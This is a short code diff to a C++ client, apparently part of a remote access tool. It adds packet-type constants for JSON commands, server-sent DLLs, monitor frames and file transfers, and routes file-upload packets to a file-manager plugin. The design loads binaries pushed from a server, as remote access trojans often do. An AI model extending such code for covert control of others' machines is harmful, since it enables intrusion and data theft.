@@ -18,6 +18,12 @@
 using json = nlohmann::json;
 using namespace std;
 
+#define PACKET_TYPE_JSON            0x01
+#define PACKET_TYPE_DLL             0x02
+#define PACKET_TYPE_MONITOR_FRAME   0x03
+#define PACKET_TYPE_FILE_UPLOAD     0x04
+#define PACKET_TYPE_FILE_DOWNLOAD   0x05
+
 #pragma pack(push, 1)
 struct PacketHeader {
     uint16_t signature; // 0x524E ('NR')
@@ -194,9 +200,17 @@ private:
                         if (recv_buffer.size() < sizeof(PacketHeader) + header->size) break;
 
                         uint8_t* payload = recv_buffer.data() + sizeof(PacketHeader);
-                        if (header->type == 0x01) {
+                        if (header->type == PACKET_TYPE_JSON) {
                             process_json_command(string((char*)payload, header->size));
-                        } else if (header->type == 0x02) {
+                        } else if (header->type == PACKET_TYPE_FILE_UPLOAD) {
+                            if (pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
+                                vector<uint8_t> payload_vec(payload, payload + header->size);
+                                pluginMgr.executePluginBinary(FILE_MANAGER_PLUGIN_ID, "HandleBinary", sock, payload_vec);
+                            } else {
+                                request_plugin(FILE_MANAGER_PLUGIN_ID);
+                                // Note: In a production app, you'd queue this binary packet to run after the plugin loads.
+                            }
+                        } else if (header->type == PACKET_TYPE_DLL) {
                             cout << "[+] DLL received from server." << endl;
                             vector<uint8_t> dll_data(payload, payload + header->size);
                             string pluginId = pendingPluginId.empty() ? INFORMATION_PLUGIN_ID : pendingPluginId;
